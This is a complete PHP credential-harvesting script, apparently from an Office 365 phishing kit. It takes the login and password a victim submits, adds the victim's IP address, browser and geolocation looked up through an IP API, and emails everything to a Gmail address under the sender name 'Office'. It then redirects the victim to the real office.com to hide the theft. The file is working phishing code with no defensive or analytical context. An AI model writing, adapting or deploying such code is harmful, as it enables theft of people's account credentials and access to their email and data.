<?

$ip = getenv("REMOTE_ADDR");
//Get IP Country City
$url = "http://api.ipinfodb.com/v3/ip-country/?key=bdf624a70b290f75ecdf08f61ba30bb97b946fcd08a5dd35eeaabbc7b6b3f354&ip=$ip";
$url = "http://api.ipinfodb.com/v3/ip-city/?key=bdf624a70b290f75ecdf08f61ba30bb97b946fcd08a5dd35eeaabbc7b6b3f354&ip=$ip";
$ipCountryCityInfo = file_get_contents($url);
//
$browser = $_SERVER['HTTP_USER_AGENT'];


$message .= "User: ".$_POST["login"]."\n";
$message .= "Pass: ".$_POST["passwd"]."\n";
$message .= "Country: ".$ipCountryCityInfo."\n";
$message .= "IP: ".$ip."\n";
$message .= "User-Agent: ".$browser."\n";



$recipient = "accunnt@gmail.com";
$subject = "365";
$headers = "From: Office";
mail($recipient,$subject,$message,$headers);
header("Location: https://www.office.com");
?>